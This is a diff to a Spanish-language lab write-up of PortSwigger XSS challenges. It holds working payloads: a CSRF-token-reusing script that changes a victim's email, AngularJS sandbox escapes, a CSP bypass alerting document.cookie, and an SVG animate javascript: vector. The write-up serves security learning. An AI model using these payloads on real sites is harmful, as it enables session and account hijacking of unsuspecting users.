@@ -532,7 +532,7 @@ Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales
 
 En este caso, consolidamos la explotación automatizando todo el flujo: cuando una víctima visualiza el comentario malicioso, su navegador realiza una petición a su propia página de perfil, extrae el token CSRF del formulario oculto, y lo reutiliza inmediatamente para enviar una petición de cambio de correo electrónico sin que el usuario lo sepa.
 
-Este enfoque permite realizar una acción sensible —como modificar información de cuenta— sin interacción directa por parte de la víctima, utilizando su sesión activa y su token legítimo.
+Este enfoque permite realizar una acción sensible como modificar información de cuenta— sin interacción directa por parte de la víctima, utilizando su sesión activa y su token legítimo.
 
 
 ```html
@@ -548,4 +548,75 @@ req2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 var data = "email="+ encodeURIComponent("test2@test.com")+ "&csrf="+ encodeURIComponent(csrf_token);
 req2.send(data)
 </script>
+```
+
+## Reto 25: XSS reflejado con escape sandbox de AngularJS sin cadenas
+
+Este laboratorio utiliza AngularJS de una manera inusual donde el $eval La función no está disponible y no podrá utilizar ninguna cadena en AngularJS.
+
+Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que escape del entorno limitado y ejecute el siguiente comando: alertfunción sin utilizar la $eval función. 
+
+La inyección ocurre dentro de una expresión Angular, pero el entorno está configurado para evitar el uso de ‘eval’ y bloquear por completo cualquier intento de utilizar cadenas de texto.
+
+El enfoque consiste en usar funciones nativas de JavaScript para construir cadenas de forma indirecta. Aprovechamos el método ‘toString()‘ y la propiedad ‘constructor‘ para acceder al prototipo de los objetos y redefinir cómo se comportan. En concreto, se sobrescribe el método ‘charAt‘ del prototipo de las cadenas, lo que permite eludir el sistema de seguridad interno de AngularJS.
+
+Luego pasamos una expresión al filtro ‘orderBy‘, y generamos el código deseado utilizando ‘fromCharCode‘ con los valores numéricos correspondientes a los caracteres de la cadena ‘x=alert(1)‘. Como hemos alterado el comportamiento interno de las cadenas, AngularJS permite que esta expresión se ejecute donde normalmente estaría bloqueada.
+
+```Angular
+angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+                            $scope.query = {};
+                            var key = 'search';
+                            $scope.query[key] = 'testing';
+                            $scope.value = $parse(key)($scope.query);
+                        });
+```
+
+Para resolver el laboratorio tenemos que emplear el código en AngularJS para salir de la sandbox 
+
+```AngularJS
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+
+//los numeros son la expresion [x=alert(1)] codificada
+
+```
+
+## Reto 26 : XSS reflejado con escape de sandbox de AngularJS y CSP
+
+Este laboratorio utiliza CSP y AngularJS.
+
+Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que evite CSP, escape del entorno limitado de AngularJS y alerte document.cookie. 
+
+Una política CSP que impide la ejecución directa de scripts no autorizados, y el sandbox de AngularJS, que filtra el acceso a objetos críticos como el contexto global del navegador.
+
+Para evadir ambas restricciones, construimos un vector que utiliza una expresión Angular inyectada dentro de un evento enfocado. Aprovechamos el evento ng-focus para ejecutar código al activarse el elemento y accedemos al objeto del evento a través de una variable predefinida por Angular. Esta variable contiene una ruta hacia el objeto window, sin necesidad de referenciarlo directamente, lo que nos permite eludir la validación del sandbox.
+
+```html
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
+```
+
+La inyección se construye utilizando el filtro orderBy con un argumento malicioso. En lugar de invocar directamente la función de alerta, se asigna a una variable dentro del filtro, y esta se ejecuta cuando se alcanza el contexto de ejecución adecuado.
+
+```html
+<script>
+location = 'https://0a35007903b0071480db0372008300e9.web-security-academy.net/?search=<input id=x+ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x';
+</script>
+```
+
+## Reto 27: XSS reflejado con controladores de eventos y hrefatributos bloqueados
+
+Este laboratorio contiene una vulnerabilidad XSS reflejada con algunas etiquetas incluidas en la lista blanca, pero todos los eventos y anclajes hrefLos atributos están bloqueados.
+
+Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que inyecte un vector que, al hacer clic, llame al alert función.
+
+Tenga en cuenta que debe etiquetar su vector con la palabra "Clic" para inducir al usuario del laboratorio simulado a hacer clic en él. Por ejemplo:
+<a href="">Click me</a>
+
+Todos los eventos JavaScript y los atributos href están bloqueados, lo que impide usar vectores clásicos como enlaces con scripts o atributos on-click.
+
+Para evadir estas restricciones, utilizamos una estructura SVG compuesta que simula un enlace visual. Insertamos una etiqueta de animación dentro de un elemento interactivo y manipulamos un atributo gráfico permitido para que, al ser activado, modifique el valor del enlace con un esquema que ejecuta código.
+
+La animación se activa de forma implícita al interactuar con el contenido, y dado que se encuentra dentro de un SVG, el navegador interpreta la secuencia de forma válida aunque los filtros bloqueen atributos estándar. Además, se incluye la palabra Click como anzuelo visual para atraer al usuario simulado del laboratorio a realizar la acción.
+
+```html
+<svg><a><animate attributeName=href values=javascript:alert(0) /><text>Click me!</text></a>
 ```
